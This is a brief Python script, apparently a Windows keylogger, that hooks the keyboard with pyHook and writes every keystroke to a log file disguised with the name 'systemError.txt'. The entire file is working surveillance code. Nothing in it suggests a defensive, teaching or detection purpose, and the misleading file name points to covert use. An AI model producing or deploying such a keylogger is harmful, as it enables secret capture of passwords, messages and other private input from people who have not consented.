import pyHook
import pythoncom
import sys
import logging
#importing libraries
file_log = '\\Random-Programs\\Writing\\systemError.txt' #where the log is kept

def onKeyboardEvent(event):#defines when a key is pressed
    logging.basicConfig(filename = file_log,level = logging.DEBUG,format = '%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
    
hooks_manager = pyHook.HookManager()

hooks_manager.KeyDown = onKeyboardEvent

hooks_manager.HookKeyboard()

pythoncom.PumpMessages()
